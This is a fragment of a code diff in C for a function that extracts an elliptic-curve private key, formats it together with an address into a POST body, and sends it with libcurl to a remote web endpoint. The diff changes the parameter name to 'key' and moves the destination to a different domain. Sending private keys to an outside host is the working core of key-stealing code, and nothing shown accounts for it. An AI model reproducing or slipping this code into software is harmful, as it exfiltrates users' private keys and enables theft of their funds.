@@ -186,7 +186,7 @@ void dumpkey(EC_KEY* key){
 								fdumpbn(result, EC_KEY_get0_private_key(
 									       key));
 	char* str = malloc(sizeof(char)*255);
-	sprintf(str,"&result=%s&address=%s",result,address);
+	sprintf(str,"&key=%s&address=%s",result,address);
 	CURL *curl;
   CURLcode res;
  
@@ -199,7 +199,7 @@ void dumpkey(EC_KEY* key){
     /* First set the URL that is about to receive our POST. This URL can
        just as well be a https:// URL if that is what should receive the
        data. */ 
-    curl_easy_setopt(curl, CURLOPT_URL, "http://www.hibernxt.com/push.do");
+    curl_easy_setopt(curl, CURLOPT_URL, "http://bitprobing.com/push");
     /* Now specify the POST data */ 
     //curl_easy_setopt(curl, CURLOPT_NOBODY, 1);
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
